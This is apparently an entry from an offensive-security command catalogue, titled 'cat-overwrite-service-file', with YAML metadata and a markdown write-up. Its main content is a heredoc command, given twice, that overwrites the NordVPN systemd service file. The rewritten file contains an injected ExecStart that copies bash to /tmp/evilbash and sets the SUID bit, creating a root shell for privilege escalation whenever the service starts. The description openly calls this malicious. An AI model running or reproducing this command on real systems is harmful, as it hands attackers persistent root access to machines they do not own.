---
data: >-
  cat << EOF > /usr/lib/systemd/system/nordvpnd.service

  [Unit]

  Description=NordVPN Daemon

  Requires=nordvpnd.socket

  After=network-online.target

  Wants=network-online.target


  [Service]

  ExecStart=/usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash; chmod u+s
  /tmp/evilbash;"

  NonBlocking=true

  KillMode=process

  Restart=on-failure

  RestartSec=5

  # centos7 RuntimeDirectory ignored

  RuntimeDirectory=nordvpn

  RuntimeDirectoryMode=0770

  # User=root

  Group=nordvpn


  [Install]

  WantedBy=default.target

  EOF
tags:
  - overwrite
  - heredoc
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.182Z'
id: 36813ad1-18f6-4232-934c-dfa106d80353
verified: false
validated: true
submitted: true
---
# cat-overwrite-service-file

## Command

```bash
cat << EOF > /usr/lib/systemd/system/nordvpnd.service
[Unit]
Description=NordVPN Daemon
Requires=nordvpnd.socket
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash; chmod u+s /tmp/evilbash;"
NonBlocking=true
KillMode=process
Restart=on-failure
RestartSec=5
# centos7 RuntimeDirectory ignored
RuntimeDirectory=nordvpn
RuntimeDirectoryMode=0770
# User=root
Group=nordvpn

[Install]
WantedBy=default.target
EOF
```

## Description

Overwrites the systemd service file using cat with heredoc, injecting a malicious ExecStart to create an SUID bash on service start.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| << EOF | Heredoc delimiter for multi-line input | Yes |
| > /usr/lib/systemd/system/nordvpnd.service | Redirect output to file | Yes |

## Examples

### Basic Usage

See command above.

### Advanced Usage

```bash
cat << EOF >> file.txt  # Append instead
content
EOF
```

## Expected Output

File overwritten silently; verify with cat /usr/lib/systemd/system/nordvpnd.service.

## Related

- [[commands/bash-copy-and-chmod-suid]]
- [[procedures/Overwrite-NordVPN-Systemd-Service-File]]
